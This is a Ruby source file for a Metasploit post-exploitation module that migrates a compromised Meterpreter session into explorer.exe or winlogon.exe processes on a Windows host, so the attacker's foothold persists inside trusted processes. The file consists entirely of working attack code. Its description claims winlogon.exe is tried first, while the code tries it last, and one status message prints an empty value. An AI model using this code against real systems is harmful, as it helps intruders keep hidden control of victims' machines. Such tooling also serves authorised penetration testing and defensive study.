##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Smart Process Migration',
      'Description'   => %q{ This module will migrate a Meterpreter session.
        It will first attempt to migrate to winlogon.exe . If that fails it will
        then look at all of the explorer.exe processes. If there is one that exists
        for the user context the session is already in it will try that. Failing that it will fall back
        and try any other explorer.exe processes it finds},
      'License'       => MSF_LICENSE,
      'Author'        => [ 'thelightcosine'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))


  end

  def run
    server = client.sys.process.open
    original_pid = server.pid
    print_status("Current server process: #{server.name} (#{server.pid})")

    uid = client.sys.config.getuid

    processes = client.sys.process.get_processes

    uid_explorer_procs = []
    explorer_procs = []
    winlogon_procs = []
    processes.each do |proc|
      uid_explorer_procs << proc if proc['name'] == "explorer.exe" and proc["user"] == uid
      explorer_procs << proc if proc['name'] == "explorer.exe" and proc["user"] != uid
      winlogon_procs << proc if proc['name'] == "winlogon.exe"
    end

    print_status "Attempting to move into explorer.exe for current user..."
    uid_explorer_procs.each { |proc| return if attempt_migration(proc['pid']) }
    print_status "Attempting to move into explorer.exe for other users..."
    explorer_procs.each { |proc| return if attempt_migration(proc['pid']) }
    print_status "Attempting to move into winlogon.exe"
    winlogon_procs.each { |proc| return if attempt_migration(proc['pid']) }

    print_error "Was unable to sucessfully migrate into any of our likely candidates"
  end


  def attempt_migration(target_pid)
    begin
      print_good("Migrating to #{target_pid}")
      client.core.migrate(target_pid)
      print_good("Successfully migrated to process #{}")
      return true
    rescue ::Exception => e
      print_error("Could not migrate in to process.")
      print_error(e.to_s)
      return false
    end
  end
end
